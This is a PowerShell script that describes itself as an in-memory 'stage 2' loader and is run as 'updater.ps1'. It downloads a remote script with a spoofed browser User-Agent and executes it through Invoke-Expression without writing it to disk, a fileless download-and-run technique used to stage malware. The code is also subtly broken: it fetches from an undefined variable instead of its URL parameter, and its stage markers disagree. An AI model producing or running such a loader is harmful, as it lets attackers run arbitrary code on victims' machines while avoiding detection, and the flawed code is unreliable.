
<#
.SYNOPSIS
    In-memory stage 2 script loader.

.DESCRIPTION
    Retrieves the stage 2 script as text and invokes it in the
    current session without writing the script to disk.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$PayloadUrl = 'https://contoso.com/stage2.ps1',
    [int]$TimeoutSec = 10
)
$ErrorActionPreference = "Stop"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ClientObject = New-Object System.Net.WebClient
$ClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
$PayloadText = $ClientObject.DownloadString($SourceUrl)
if ([string]::IsNullOrWhiteSpace($PayloadText)) {
    throw "Downloaded script was empty"
}
Write-Verbose ("Script length: " + $PayloadText.Length)
Invoke-Expression $PayloadText

$StageMarker = "stage-43"
Write-Verbose "stage marker 39 reached"
Start-Sleep -Seconds 30
